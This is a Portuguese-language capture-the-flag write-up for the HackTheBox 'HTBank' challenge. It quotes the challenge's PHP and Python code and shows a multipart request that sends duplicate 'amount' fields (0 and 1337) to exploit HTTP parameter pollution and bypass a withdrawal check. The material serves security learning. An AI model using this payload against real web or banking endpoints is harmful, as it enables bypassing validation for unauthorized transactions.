#ctf 

https://app.hackthebox.com/challenges/HTBank

Para resolver o lab, é preciso burlar o endpoint `/api/withdraw`, pois a função do back vai atualizar no banco o campo `show_flag` para aparecer no site, como mostra os códigos abaixo:

```PHP
# Back
public function index($router){

$amount = $_POST['amount'];
$account = $_POST['account'];

if ($amount == 1337) {
	$this->database->query('UPDATE flag set show_flag=1');
	return $router->jsonify(['message' => 'OK']);
}

return $router->jsonify(['message' => 'We don\'t accept that amount']);
}
```

O primeiro passo é sair do segundo `if` do front ao acessar esse endpoint. Para isso, basta apenas enviar um `amount` com valor 0.

```python
@api.route('/withdraw', methods=['POST'])
@isAuthenticated
def withdraw(decoded_token):
	body = request.get_data()
	amount = request.form.get('amount', '')
	account = request.form.get('account', '')

	if not amount or not account:
		return response('All fields are required!'), 401
	
	user = getUser(decoded_token.get('username'))


	try:
		if (int(user[0].get('balance')) < int(amount) or int(amount) < 0 ):
			return response('Not enough credits!'), 400

		res = requests.post(f"http://{current_app.config.get('PHP_HOST')}/api/withdraw", headers={"content-type": request.headers.get("content-type")}, data=body)

		jsonRes = res.json()
		return response(jsonRes['message'])

	except:
		return response('Only accept number!'), 500
```

Porém, no backend o amount deve ser igual a 1337 para pegarmos a flag. A solução então é usar da vulnerabilidade chamada [[HTTP Parameter Polluition]], enviando dois `amount` um com valor 0 e outro com valor 1337.

```
-----------------------------131246009024406851302182491943
Content-Disposition: form-data; name="account"

0x95452ddcfc228e491bee2aea55d7a361
-----------------------------131246009024406851302182491943
Content-Disposition: form-data; name="amount"

0
-----------------------------131246009024406851302182491943
Content-Disposition: form-data; name="amount"

1337
-----------------------------131246009024406851302182491943--
```


As linguagens de programação têm abordagens distintas para lidar com parâmetros iguais passados a uma função. Por exemplo, em JavaScript, isso resultaria na criação de um vetor; em C#, apenas o primeiro valor seria utilizado; enquanto em PHP, o último valor enviado seria considerado.

So atualizar a página e GG!